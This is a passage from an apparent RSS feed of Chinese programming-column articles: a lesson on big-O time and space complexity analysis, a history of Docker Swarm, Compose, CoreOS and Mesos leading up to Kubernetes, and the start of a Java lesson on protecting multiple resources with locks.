&lt;p>这里有段非常简单的代码，求 1,2,3&amp;hellip;n 的累加和。现在，我就带你一块来估算一下这段代码的执行时间。&lt;/p>
&lt;pre>&lt;code> int cal(int n) {
int sum = 0;
int i = 1;
for (; i &amp;lt;= n; ++i) {
sum = sum + i;
}
return sum;
}
&lt;/code>&lt;/pre>
&lt;p>从 CPU 的角度来看，这段代码的每一行都执行着类似的操作：&lt;strong>读数据&lt;/strong> -&lt;strong>运算&lt;/strong> -&lt;strong>写数据&lt;/strong>。尽管每行代码对应的 CPU 执行的个数、执行的时间都不一样，但是，我们这里只是粗略估计，所以可以假设每行代码执行的时间都一样，为 unit_time。在这个假设的基础之上，这段代码的总执行时间是多少呢？&lt;/p>
&lt;p>第 2、3 行代码分别需要 1 个 unit_time 的执行时间，第 4、5 行都运行了 n 遍，所以需要 2n*unit_time 的执行时间，所以这段代码总的执行时间就是 (2n+2)*unit_time。可以看出来，&lt;strong>所有代码的执行时间 T(n) 与每行代码的执行次数成正比&lt;/strong>。&lt;/p>
&lt;p>按照这个分析思路，我们再来看这段代码。&lt;/p>
&lt;pre>&lt;code> int cal(int n) {
int sum = 0;
int i = 1;
int j = 1;
for (; i &amp;lt;= n; ++i) {
j = 1;
for (; j &amp;lt;= n; ++j) {
sum = sum + i * j;
}
}
}
&lt;/code>&lt;/pre>
&lt;p>我们依旧假设每个语句的执行时间是 unit_time。那这段代码的总执行时间 T(n) 是多少呢？&lt;/p>
&lt;p>第 2、3、4 行代码，每行都需要 1 个 unit_time 的执行时间，第 5、6 行代码循环执行了 n 遍，需要 2n * unit_time 的执行时间，第 7、8 行代码循环执行了 n^2^遍，所以需要 2n^2^ * unit_time 的执行时间。所以，整段代码总的执行时间 T(n) = (2n^2^+2n+3)*unit_time。&lt;/p>
&lt;p>尽管我们不知道 unit_time 的具体值，但是通过这两段代码执行时间的推导过程，我们可以得到一个非常重要的规律，那就是，&lt;strong>所有代码的执行时间 T(n) 与每行代码的执行次数 n 成正比&lt;/strong>。&lt;/p>
&lt;p>我们可以把这个规律总结成一个公式。注意，大 O 就要登场了！&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/22/ef/22900968aa2b190072c985a08b0e92ef.png" alt="">&lt;/p>
&lt;p>我来具体解释一下这个公式。其中，T(n) 我们已经讲过了，它表示代码执行的时间；n 表示数据规模的大小；f(n) 表示每行代码执行的次数总和。因为这是一个公式，所以用 f(n) 来表示。公式中的 O，表示代码的执行时间 T(n) 与 f(n) 表达式成正比。&lt;/p>
&lt;p>所以，第一个例子中的 T(n) = O(2n+2)，第二个例子中的 T(n) = O(2n^2^+2n+3)。这就是&lt;strong>大 O 时间复杂度表示法&lt;/strong> 。大 O 时间复杂度实际上并不具体表示代码真正的执行时间，而是表示&lt;strong>代码执行时间随数据规模增长的变化趋势&lt;/strong> ，所以，也叫作&lt;strong>渐进时间复杂度&lt;/strong> （asymptotic time complexity），简称&lt;strong>时间复杂度&lt;/strong>。&lt;/p>
&lt;p>当 n 很大时，你可以把它想象成 10000、100000。而公式中的低阶、常量、系数三部分并不左右增长趋势，所以都可以忽略。我们只需要记录一个最大量级就可以了，如果用大 O 表示法表示刚讲的那两段代码的时间复杂度，就可以记为：T(n) = O(n)； T(n) = O(n^2^)。&lt;/p>
&lt;h2 id="时间复杂度分析">时间复杂度分析&lt;/h2>
&lt;p>前面介绍了大 O 时间复杂度的由来和表示方法。现在我们来看下，如何分析一段代码的时间复杂度？我这儿有三个比较实用的方法可以分享给你。&lt;/p>
&lt;p>&lt;strong>1. 只关注循环执行次数最多的一段代码&lt;/strong>&lt;/p>
&lt;p>我刚才说了，大 O 这种复杂度表示方法只是表示一种变化趋势。我们通常会忽略掉公式中的常量、低阶、系数，只需要记录一个最大阶的量级就可以了。所以，&lt;strong>我们在分析一个算法、一段代码的时间复杂度的时候，也只关注循环执行次数最多的那一段代码就可以了&lt;/strong>。这段核心代码执行次数的 n 的量级，就是整段要分析代码的时间复杂度。&lt;/p>
&lt;p>为了便于你理解，我还拿前面的例子来说明。&lt;/p>
&lt;pre>&lt;code> int cal(int n) {
int sum = 0;
int i = 1;
for (; i &amp;lt;= n; ++i) {
sum = sum + i;
}
return sum;
}
&lt;/code>&lt;/pre>
&lt;p>其中第 2、3 行代码都是常量级的执行时间，与 n 的大小无关，所以对于复杂度并没有影响。循环执行次数最多的是第 4、5 行代码，所以这块代码要重点分析。前面我们也讲过，这两行代码被执行了 n 次，所以总的时间复杂度就是 O(n)。&lt;/p>
&lt;p>&lt;strong>2. 加法法则：总复杂度等于量级最大的那段代码的复杂度&lt;/strong>&lt;/p>
&lt;p>我这里还有一段代码。你可以先试着分析一下，然后再往下看跟我的分析思路是否一样。&lt;/p>
&lt;pre>&lt;code>int cal(int n) {
int sum_1 = 0;
int p = 1;
for (; p &amp;lt; 100; ++p) {
sum_1 = sum_1 + p;
}
int sum_2 = 0;
int q = 1;
for (; q &amp;lt; n; ++q) {
sum_2 = sum_2 + q;
}
int sum_3 = 0;
int i = 1;
int j = 1;
for (; i &amp;lt;= n; ++i) {
j = 1;
for (; j &amp;lt;= n; ++j) {
sum_3 = sum_3 + i * j;
}
}
return sum_1 + sum_2 + sum_3;
}
&lt;/code>&lt;/pre>
&lt;p>这个代码分为三部分，分别是求 sum_1、sum_2、sum_3。我们可以分别分析每一部分的时间复杂度，然后把它们放到一块儿，再取一个量级最大的作为整段代码的复杂度。&lt;/p>
&lt;p>第一段的时间复杂度是多少呢？这段代码循环执行了 100 次，所以是一个常量的执行时间，跟 n 的规模无关。&lt;/p>
&lt;p>这里我要再强调一下，即便这段代码循环 10000 次、100000 次，只要是一个已知的数，跟 n 无关，照样也是常量级的执行时间。当 n 无限大的时候，就可以忽略。尽管对代码的执行时间会有很大影响，但是回到时间复杂度的概念来说，它表示的是一个算法执行效率与数据规模增长的变化趋势，所以不管常量的执行时间多大，我们都可以忽略掉。因为它本身对增长趋势并没有影响。&lt;/p>
&lt;p>那第二段代码和第三段代码的时间复杂度是多少呢？答案是 O(n) 和 O(n^2^)，你应该能容易就分析出来，我就不啰嗦了。&lt;/p>
&lt;p>综合这三段代码的时间复杂度，我们取其中最大的量级。所以，整段代码的时间复杂度就为 O(n^2^)。也就是说：&lt;strong>总的时间复杂度&lt;strong>&lt;strong>就&lt;/strong>&lt;/strong>等于量级最大的那段代码的时间复杂度&lt;/strong>。那我们将这个规律抽象成公式就是：&lt;/p>
&lt;p>如果 T1(n)=O(f(n))，T2(n)=O(g(n))；那么 T(n)=T1(n)+T2(n)=max(O(f(n)), O(g(n))) =O(max(f(n), g(n))).&lt;/p>
&lt;p>&lt;strong>3. 乘法法则：嵌套代码的复杂度等于嵌套内外代码复杂度的乘积&lt;/strong>&lt;/p>
&lt;p>我刚讲了一个复杂度分析中的加法法则，这儿还有一个&lt;strong>乘法法则&lt;/strong>。类比一下，你应该能&amp;quot;猜到&amp;quot;公式是什么样子的吧？&lt;/p>
&lt;p>如果 T1(n)=O(f(n))，T2(n)=O(g(n))；那么 T(n)=T1(n)*T2(n)=O(f(n))*O(g(n))=O(f(n)*g(n)).&lt;/p>
&lt;p>也就是说，假设 T1(n) = O(n)，T2(n) = O(n^2^)，则 T1(n) * T2(n) = O(n^3^)。落实到具体的代码上，我们可以把乘法法则看成是&lt;strong>嵌套循环&lt;/strong>，我举个例子给你解释一下。&lt;/p>
&lt;pre>&lt;code>int cal(int n) {
int ret = 0;
int i = 1;
for (; i &amp;lt; n; ++i) {
ret = ret + f(i);
}
}
int f(int n) {
int sum = 0;
int i = 1;
for (; i &amp;lt; n; ++i) {
sum = sum + i;
}
return sum;
}
&lt;/code>&lt;/pre>
&lt;p>我们单独看 cal() 函数。假设 f() 只是一个普通的操作，那第 4～6 行的时间复杂度就是，T1(n) = O(n)。但 f() 函数本身不是一个简单的操作，它的时间复杂度是 T2(n) = O(n)，所以，整个 cal() 函数的时间复杂度就是，T(n) = T1(n) * T2(n) = O(n*n) = O(n^2^)。&lt;/p>
&lt;p>我刚刚讲了三种复杂度的分析技巧。不过，你并不用刻意去记忆。实际上，复杂度分析这个东西关键在于&amp;quot;熟练&amp;quot;。你只要多看案例，多分析，就能做到&amp;quot;无招胜有招&amp;quot;。&lt;/p>
&lt;h2 id="几种常见时间复杂度实例分析">几种常见时间复杂度实例分析&lt;/h2>
&lt;p>虽然代码千差万别，但是常见的复杂度量级并不多。我稍微总结了一下，这些复杂度量级几乎涵盖了你今后可以接触的所有代码的复杂度量级。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/37/0a/3723793cc5c810e9d5b06bc95325bf0a.jpg" alt="">&lt;/p>
&lt;p>对于刚罗列的复杂度量级，我们可以粗略地分为两类，&lt;strong>多项式量级&lt;/strong> 和&lt;strong>非多项式量级&lt;/strong> 。其中，非多项式量级只有两个：O(2^n^) 和 O(n!)。&lt;/p>
&lt;p>当数据规模 n 越来越大时，非多项式量级算法的执行时间会急剧增加，求解问题的执行时间会无限增长。所以，非多项式时间复杂度的算法其实是非常低效的算法。因此，关于 NP 时间复杂度我就不展开讲了。我们主要来看几种常见的&lt;strong>多项式时间复杂度&lt;/strong>。&lt;/p>
&lt;p>&lt;strong>1. O(1)&lt;/strong>&lt;/p>
&lt;p>首先你必须明确一个概念，O(1) 只是常量级时间复杂度的一种表示方法，并不是指只执行了一行代码。比如这段代码，即便有 3 行，它的时间复杂度也是 O(1），而不是 O(3)。&lt;/p>
&lt;pre>&lt;code> int i = 8;
int j = 6;
int sum = i + j;
&lt;/code>&lt;/pre>
&lt;p>我稍微总结一下，只要代码的执行时间不随 n 的增大而增长，这样代码的时间复杂度我们都记作 O(1)。或者说，&lt;strong>一般&lt;strong>&lt;strong>情况下&lt;/strong>&lt;/strong>，只要算法中不存在循环语句、递归语句，即使有成千上万行的代码，其时间复杂度也是Ο(1)&lt;/strong>。&lt;/p>
&lt;p>&lt;strong>2. O(logn)、O(nlogn)&lt;/strong>&lt;/p>
&lt;p>对数阶时间复杂度非常常见，同时也是最难分析的一种时间复杂度。我通过一个例子来说明一下。&lt;/p>
&lt;pre>&lt;code> i=1;
while (i &amp;lt;= n) {
i = i * 2;
}
&lt;/code>&lt;/pre>
&lt;p>根据我们前面讲的复杂度分析方法，第三行代码是循环执行次数最多的。所以，我们只要能计算出这行代码被执行了多少次，就能知道整段代码的时间复杂度。&lt;/p>
&lt;p>从代码中可以看出，变量 i 的值从 1 开始取，每循环一次就乘以 2。当大于 n 时，循环结束。还记得我们高中学过的等比数列吗？实际上，变量 i 的取值就是一个等比数列。如果我把它一个一个列出来，就应该是这个样子的：&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/9b/9a/9b1c88264e7a1a20b5954be9bc4bec9a.jpg" alt="">&lt;/p>
&lt;p>所以，我们只要知道 x 值是多少，就知道这行代码执行的次数了。通过 2^x^=n 求解 x 这个问题我们想高中应该就学过了，我就不多说了。x=log~2~n，所以，这段代码的时间复杂度就是 O(log~2~n)。&lt;/p>
&lt;p>现在，我把代码稍微改下，你再看看，这段代码的时间复杂度是多少？&lt;/p>
&lt;pre>&lt;code> i=1;
while (i &amp;lt;= n) {
i = i * 3;
}
&lt;/code>&lt;/pre>
&lt;p>根据我刚刚讲的思路，很简单就能看出来，这段代码的时间复杂度为 O(log~3~n)。&lt;/p>
&lt;p>实际上，不管是以 2 为底、以 3 为底，还是以 10 为底，我们可以把所有对数阶的时间复杂度都记为 O(logn)。为什么呢？&lt;/p>
&lt;p>我们知道，对数之间是可以互相转换的，log~3~n 就等于 log~3~2 * log~2~n，所以 O(log~3~n) = O(C * log~2~n)，其中 C=log~3~2 是一个常量。基于我们前面的一个理论：&lt;strong>在采用大 O 标记复杂度的时候，可以忽略系数，即 O(Cf(n)) = O(f(n))&lt;/strong> 。所以，O(log~2~n) 就等于 O(log~3~n)。因此，在对数阶时间复杂度的表示方法里，我们忽略对数的&amp;quot;底&amp;quot;，统一表示为 O(logn)。&lt;/p>
&lt;p>如果你理解了我前面讲的 O(logn)，那 O(nlogn) 就很容易理解了。还记得我们刚讲的乘法法则吗？如果一段代码的时间复杂度是 O(logn)，我们循环执行 n 遍，时间复杂度就是 O(nlogn) 了。而且，O(nlogn) 也是一种非常常见的算法时间复杂度。比如，归并排序、快速排序的时间复杂度都是 O(nlogn)。&lt;/p>
&lt;p>&lt;strong>3. O(m+n)、O(m*n)&lt;/strong>&lt;/p>
&lt;p>我们再来讲一种跟前面都不一样的时间复杂度，代码的复杂度&lt;strong>由两个数据的规模&lt;/strong>来决定。老规矩，先看代码！&lt;/p>
&lt;pre>&lt;code>int cal(int m, int n) {
int sum_1 = 0;
int i = 1;
for (; i &amp;lt; m; ++i) {
sum_1 = sum_1 + i;
}
int sum_2 = 0;
int j = 1;
for (; j &amp;lt; n; ++j) {
sum_2 = sum_2 + j;
}
return sum_1 + sum_2;
}
&lt;/code>&lt;/pre>
&lt;p>从代码中可以看出，m 和 n 是表示两个数据规模。我们无法事先评估 m 和 n 谁的量级大，所以我们在表示复杂度的时候，就不能简单地利用加法法则，省略掉其中一个。所以，上面代码的时间复杂度就是 O(m+n)。&lt;/p>
&lt;p>针对这种情况，原来的加法法则就不正确了，我们需要将加法规则改为：T1(m) + T2(n) = O(f(m) + g(n))。但是乘法法则继续有效：T1(m)*T2(n) = O(f(m) * f(n))。&lt;/p>
&lt;h2 id="空间复杂度分析">空间复杂度分析&lt;/h2>
&lt;p>前面，咱们花了很长时间讲大 O 表示法和时间复杂度分析，理解了前面讲的内容，空间复杂度分析方法学起来就非常简单了。&lt;/p>
&lt;p>前面我讲过，时间复杂度的全称是&lt;strong>渐进时间复杂度&lt;/strong> ，&lt;strong>表示算法的执行时间与数据规模之间的增长关系&lt;/strong> 。类比一下，空间复杂度全称就是&lt;strong>渐进空间复杂度&lt;/strong> （asymptotic space complexity），&lt;strong>表示算法的存储空间与数据规模之间的增长关系&lt;/strong>。&lt;/p>
&lt;p>我还是拿具体的例子来给你说明。（这段代码有点&amp;quot;傻&amp;quot;，一般没人会这么写，我这么写只是为了方便给你解释。）&lt;/p>
&lt;pre>&lt;code>void print(int n) {
int i = 0;
int[] a = new int[n];
for (i; i &amp;lt;n; ++i) {
a[i] = i * i;
}
for (i = n-1; i &amp;gt;= 0; --i) {
print out a[i]
}
}
&lt;/code>&lt;/pre>
&lt;p>跟时间复杂度分析一样，我们可以看到，第 2 行代码中，我们申请了一个空间存储变量 i，但是它是常量阶的，跟数据规模 n 没有关系，所以我们可以忽略。第 3 行申请了一个大小为 n 的 int 类型数组，除此之外，剩下的代码都没有占用更多的空间，所以整段代码的空间复杂度就是 O(n)。&lt;/p>
&lt;p>我们常见的空间复杂度就是 O(1)、O(n)、O(n^2^ )，像 O(logn)、O(nlogn) 这样的对数阶复杂度平时都用不到。而且，空间复杂度分析比时间复杂度分析要简单很多。所以，对于空间复杂度，掌握刚我说的这些内容已经足够了。&lt;/p>
&lt;h2 id="内容小结">内容小结&lt;/h2>
&lt;p>基础复杂度分析的知识到此就讲完了，我们来总结一下。&lt;/p>
&lt;p>复杂度也叫渐进复杂度，包括时间复杂度和空间复杂度，用来分析算法执行效率与数据规模之间的增长关系，可以粗略地表示，越高阶复杂度的算法，执行效率越低。常见的复杂度并不多，从低阶到高阶有：O(1)、O(logn)、O(n)、O(nlogn)、O(n^2^ )。等你学完整个专栏之后，你就会发现几乎所有的数据结构和算法的复杂度都跑不出这几个。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/49/04/497a3f120b7debee07dc0d03984faf04.jpg" alt="">&lt;/p>
&lt;p>&lt;strong>复杂度分析并不难，关键在于多练。&lt;/strong> 之后讲后面的内容时，我还会带你详细地分析每一种数据结构和算法的时间、空间复杂度。只要跟着我的思路学习、练习，你很快就能和我一样，每次看到代码的时候，简单的一眼就能看出其复杂度，难的稍微分析一下就能得出答案。&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>有人说，我们项目之前都会进行性能测试，再做代码的时间复杂度、空间复杂度分析，是不是多此一举呢？而且，每段代码都分析一下时间复杂度、空间复杂度，是不是很浪费时间呢？你怎么看待这个问题呢？&lt;/p>
&lt;p>欢迎留言和我分享，我会第一时间给你反馈。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/8e/d3/8e603e3d795fc0ab2698f6f5eabf14d3.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 03丨预习篇·小鲸鱼大事记（三）：群雄并起</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/03%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%B8%89%E7%BE%A4%E9%9B%84%E5%B9%B6%E8%B5%B7/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90-kubernetes/03%E4%B8%A8%E9%A2%84%E4%B9%A0%E7%AF%87%E5%B0%8F%E9%B2%B8%E9%B1%BC%E5%A4%A7%E4%BA%8B%E8%AE%B0%E4%B8%89%E7%BE%A4%E9%9B%84%E5%B9%B6%E8%B5%B7/</guid><description>
&lt;p>你好，我是张磊。我今天分享的主题是：小鲸鱼大事记之群雄并起。&lt;/p>
&lt;p>在上一篇文章中，我剖析了 Docker 项目迅速走红背后的技术与非技术原因，也介绍了 Docker 公司开启平台化战略的野心。可是，Docker 公司为什么在 Docker 项目已经取得巨大成功之后，却执意要重新走回那条已经让无数先驱们尘沙折戟的 PaaS 之路呢？&lt;/p>
&lt;p>实际上，Docker 项目一日千里的发展势头，一直伴随着公司管理层和股东们的阵阵担忧。他们心里明白，虽然 Docker 项目备受追捧，但用户们最终要部署的，还是他们的网站、服务、数据库，甚至是云计算业务。&lt;/p>
&lt;p>这就意味着，只有那些能够为用户提供平台层能力的工具，才会真正成为开发者们关心和愿意付费的产品。而 Docker 项目这样一个只能用来创建和启停容器的小工具，最终只能充当这些平台项目的&amp;quot;幕后英雄&amp;quot;。&lt;/p>
&lt;p>而谈到 Docker 项目的定位问题，就不得不说说 Docker 公司的老朋友和老对手 CoreOS 了。&lt;/p>
&lt;p>CoreOS 是一个基础设施领域创业公司。 它的核心产品是一个定制化的操作系统，用户可以按照分布式集群的方式，管理所有安装了这个操作系统的节点。从而，用户在集群里部署和管理应用就像使用单机一样方便了。&lt;/p>
&lt;p>Docker 项目发布后，CoreOS 公司很快就认识到可以把&amp;quot;容器&amp;quot;的概念无缝集成到自己的这套方案中，从而为用户提供更高层次的 PaaS 能力。所以，CoreOS 很早就成了 Docker 项目的贡献者，并在短时间内成为了 Docker 项目中第二重要的力量。&lt;/p>
&lt;p>然而，这段短暂的蜜月期到 2014 年底就草草结束了。CoreOS 公司以强烈的措辞宣布与 Docker 公司停止合作，并直接推出了自己研制的 Rocket（后来叫 rkt）容器。&lt;/p>
&lt;p>这次决裂的根本原因，正是源于 Docker 公司对 Docker 项目定位的不满足。Docker 公司解决这种不满足的方法就是，让 Docker 项目提供更多的平台层能力，即向 PaaS 项目进化。而这，显然与 CoreOS 公司的核心产品和战略发生了严重冲突。&lt;/p>
&lt;p>也就是说，Docker 公司在 2014 年就已经定好了平台化的发展方向，并且绝对不会跟 CoreOS 在平台层面开展任何合作。这样看来，Docker 公司在 2014 年 12 月的 DockerCon 上发布 Swarm 的举动，也就一点都不突然了。&lt;/p>
&lt;p>相较于 CoreOS 是依托于一系列开源项目（比如 Container Linux 操作系统、Fleet 作业调度工具、systemd 进程管理和 rkt 容器），一层层搭建起来的平台产品，Swarm 项目则是以一个完整的整体来对外提供集群管理功能。而 Swarm 的最大亮点，则是它完全使用 Docker 项目原本的容器管理 API 来完成集群管理，比如：&lt;/p>
&lt;ul>
&lt;li>
&lt;p>单机 Docker 项目：&lt;/p>
&lt;p>$ docker run &amp;quot; 我的容器&lt;/p>
&lt;/li>
&lt;li>
&lt;p>多机 Docker 项目：&lt;/p>
&lt;p>$ docker run -H &amp;quot; 我的 Swarm 集群 API 地址 &amp;quot; &amp;quot; 我的容器 &amp;quot;&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>所以在部署了 Swarm 的多机环境下，用户只需要使用原先的 Docker 指令创建一个容器，这个请求就会被 Swarm 拦截下来处理，然后通过具体的调度算法找到一个合适的 Docker Daemon 运行起来。&lt;/p>
&lt;p>这个操作方式简洁明了，对于已经了解过 Docker 命令行的开发者们也很容易掌握。所以，这样一个&amp;quot;原生&amp;quot;的 Docker 容器集群管理项目一经发布，就受到了已有 Docker 用户群的热捧。而相比之下，CoreOS 的解决方案就显得非常另类，更不用说用户还要去接受完全让人摸不着头脑、新造的容器项目 rkt 了。&lt;/p>
&lt;p>当然，Swarm 项目只是 Docker 公司重新定义&amp;quot;PaaS&amp;quot;的关键一环而已。在 2014 年到 2015 年这段时间里，Docker 项目的迅速走红催生出了一个非常繁荣的&amp;quot;Docker 生态&amp;quot;。在这个生态里，围绕着 Docker 在各个层次进行集成和创新的项目层出不穷。&lt;/p>
&lt;p>而此时已经大红大紫到&amp;quot;不差钱&amp;quot;的&lt;strong>Docker 公司，开始及时地借助这波浪潮通过并购来完善自己的平台层能力&lt;/strong>。其中一个最成功的案例，莫过于对 Fig 项目的收购。&lt;/p>
&lt;p>要知道，Fig 项目基本上只是靠两个人全职开发和维护的，可它却是当时 GitHub 上热度堪比 Docker 项目的明星。&lt;/p>
&lt;p>&lt;strong>Fig 项目之所以受欢迎，在于它在开发者面前第一次提出了&amp;quot;容器编排&amp;quot;（Container Orchestration）的概念。&lt;/strong>&lt;/p>
&lt;p>其实，&amp;ldquo;编排&amp;rdquo;（Orchestration）在云计算行业里不算是新词汇，它主要是指用户如何通过某些工具或者配置来完成一组虚拟机以及关联资源的定义、配置、创建、删除等工作，然后由云计算平台按照这些指定的逻辑来完成的过程。&lt;/p>
&lt;p>而容器时代，&amp;ldquo;编排&amp;quot;显然就是对 Docker 容器的一系列定义、配置和创建动作的管理。而 Fig 的工作实际上非常简单：假如现在用户需要部署的是应用容器 A、数据库容器 B、负载均衡容器 C，那么 Fig 就允许用户把 A、B、C 三个容器定义在一个配置文件中，并且可以指定它们之间的关联关系，比如容器 A 需要访问数据库容器 B。&lt;/p>
&lt;p>接下来，你只需要执行一条非常简单的指令：&lt;/p>
&lt;pre>&lt;code>$ fig up
&lt;/code>&lt;/pre>
&lt;p>Fig 就会把这些容器的定义和配置交给 Docker API 按照访问逻辑依次创建，你的一系列容器就都启动了；而容器 A 与 B 之间的关联关系，也会交给 Docker 的 Link 功能通过写入 hosts 文件的方式进行配置。更重要的是，你还可以在 Fig 的配置文件里定义各种容器的副本个数等编排参数，再加上 Swarm 的集群管理能力，一个活脱脱的 PaaS 呼之欲出。&lt;/p>
&lt;p>Fig 项目被收购后改名为 Compose，它成了 Docker 公司到目前为止第二大受欢迎的项目，一直到今天也依然被很多人使用。&lt;/p>
&lt;p>当时的这个容器生态里，还有很多令人眼前一亮的开源项目或公司。比如，专门负责处理容器网络的 SocketPlane 项目（后来被 Docker 公司收购），专门负责处理容器存储的 Flocker 项目（后来被 EMC 公司收购），专门给 Docker 集群做图形化管理界面和对外提供云服务的 Tutum 项目（后来被 Docker 公司收购）等等。&lt;/p>
&lt;p>一时之间，整个后端和云计算领域的聪明才俊都汇集在了这个&amp;quot;小鲸鱼&amp;quot;的周围，为 Docker 生态的蓬勃发展献上了自己的智慧。&lt;/p>
&lt;p>而除了这个异常繁荣的、围绕着 Docker 项目和公司的生态之外，还有一个势力在当时也是风头无两，这就是老牌集群管理项目 Mesos 和它背后的创业公司 Mesosphere。&lt;/p>
&lt;p>Mesos 作为 Berkeley 主导的大数据套件之一，是大数据火热时最受欢迎的资源管理项目，也是跟 Yarn 项目杀得难舍难分的实力派选手。&lt;/p>
&lt;p>不过，大数据所关注的计算密集型离线业务，其实并不像常规的 Web 服务那样适合用容器进行托管和扩容，也没有对应用打包的强烈需求，所以 Hadoop、Spark 等项目到现在也没在容器技术上投下更大的赌注；但是对于 Mesos 来说，天生的两层调度机制让它非常容易从大数据领域抽身，转而去支持受众更加广泛的 PaaS 业务。&lt;/p>
&lt;p>在这种思路的指导下，Mesosphere 公司发布了一个名为 Marathon 的项目，而这个项目很快就成为了 Docker Swarm 的一个有力竞争对手。&lt;/p>
&lt;p>&lt;strong>虽然不能提供像 Swarm 那样的原生 Docker API，Mesos 社区却拥有一个独特的竞争力：超大规模集群的管理经验。&lt;/strong>&lt;/p>
&lt;p>早在几年前，Mesos 就已经通过了万台节点的验证，2014 年之后又被广泛使用在 eBay 等大型互联网公司的生产环境中。而这次通过 Marathon 实现了诸如应用托管和负载均衡的 PaaS 功能之后，Mesos+Marathon 的组合实际上进化成了一个高度成熟的 PaaS 项目，同时还能很好地支持大数据业务。&lt;/p>
&lt;p>所以，在这波容器化浪潮中，Mesosphere 公司不失时机地提出了一个名叫&amp;quot;DC/OS&amp;rdquo;（数据中心操作系统）的口号和产品，旨在使用户能够像管理一台机器那样管理一个万级别的物理机集群，并且使用 Docker 容器在这个集群里自由地部署应用。而这，对很多大型企业来说具有着非同寻常的吸引力。&lt;/p>
&lt;p>这时，如果你再去审视当时的容器技术生态，就不难发现 CoreOS 公司竟然显得有些尴尬了。它的 rkt 容器完全打不开局面，Fleet 集群管理项目更是少有人问津，CoreOS 完全被 Docker 公司压制了。&lt;/p>
&lt;p>而处境同样不容乐观的似乎还有 RedHat，作为 Docker 项目早期的重要贡献者，RedHat 也是因为对 Docker 公司平台化战略不满而愤愤退出。但此时，它竟只剩下 OpenShift 这个跟 Cloud Foundry 同时代的经典 PaaS 一张牌可以打，跟 Docker Swarm 和转型后的 Mesos 完全不在同一个&amp;quot;竞技水平&amp;quot;之上。&lt;/p>
&lt;p>那么，事实果真如此吗？&lt;/p>
&lt;p>2014 年注定是一个神奇的年份。就在这一年的 6 月，基础设施领域的翘楚 Google 公司突然发力，正式宣告了一个名叫 Kubernetes 项目的诞生。而这个项目，不仅挽救了当时的 CoreOS 和 RedHat，还如同当年 Docker 项目的横空出世一样，再一次改变了整个容器市场的格局。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>我分享了 Docker 公司平台化战略的来龙去脉，阐述了 Docker Swarm 项目发布的意义和它背后的设计思想，介绍了 Fig（后来的 Compose）项目如何成为了继 Docker 之后最受瞩目的新星。&lt;/p>
&lt;p>同时，我也和你一起回顾了 2014~2015 年间如火如荼的容器化浪潮里群雄并起的繁荣姿态。在这次生态大爆发中，Docker 公司和 Mesosphere 公司，依托自身优势率先占据了有利位置。&lt;/p>
&lt;p>但是，更强大的挑战者们，即将在不久后纷至沓来。&lt;/p>
&lt;h2 id="思考题">思考题&lt;/h2>
&lt;p>你所在团队有没有在 2014~2015 年 Docker 热潮中，推出过相关的容器产品或者项目？现在结局如何呢？&lt;/p>
&lt;p>欢迎你给我留言，也欢迎分享给更多的朋友一起阅读。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/47/55/47a6f3bf6b92d58512d5a2ed0a556f55.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 04丨互斥锁（下）：如何用一把锁保护多个资源？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/04%E4%B8%A8%E4%BA%92%E6%96%A5%E9%94%81%E4%B8%8B%E5%A6%82%E4%BD%95%E7%94%A8%E4%B8%80%E6%8A%8A%E9%94%81%E4%BF%9D%E6%8A%A4%E5%A4%9A%E4%B8%AA%E8%B5%84%E6%BA%90/</link><pubDate>Sun, 29 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%AE%9E%E6%88%98/04%E4%B8%A8%E4%BA%92%E6%96%A5%E9%94%81%E4%B8%8B%E5%A6%82%E4%BD%95%E7%94%A8%E4%B8%80%E6%8A%8A%E9%94%81%E4%BF%9D%E6%8A%A4%E5%A4%9A%E4%B8%AA%E8%B5%84%E6%BA%90/</guid><description>
&lt;p>在上一篇文章中，我们提到&lt;strong>受保护资源和锁之间合理的关联关系应该是 N:1 的关系&lt;/strong>，也就是说可以用一把锁来保护多个资源，但是不能用多把锁来保护一个资源，并且结合文中示例，我们也重点强调了&amp;quot;不能用多把锁来保护一个资源&amp;quot;这个问题。而至于如何保护多个资源，我们今天就来聊聊。&lt;/p>
&lt;p>当我们要保护多个资源时，首先要区分这些资源是否存在关联关系。&lt;/p>
&lt;h2 id="保护没有关联关系的多个资源">保护没有关联关系的多个资源&lt;/h2>
&lt;p>在现实世界里，球场的座位和电影院的座位就是没有关联关系的，这种场景非常容易解决，那就是球赛有球赛的门票，电影院有电影院的门票，各自管理各自的。&lt;/p>
&lt;p>同样这对应到编程领域，也很容易解决。例如，银行业务中有针对账户余额（余额是一种资源）的取款操作，也有针对账户密码（密码也是一种资源）的更改操作，我们可以为账户余额和账户密码分配不同的锁来解决并发问题，这个还是很简单的。&lt;/p>
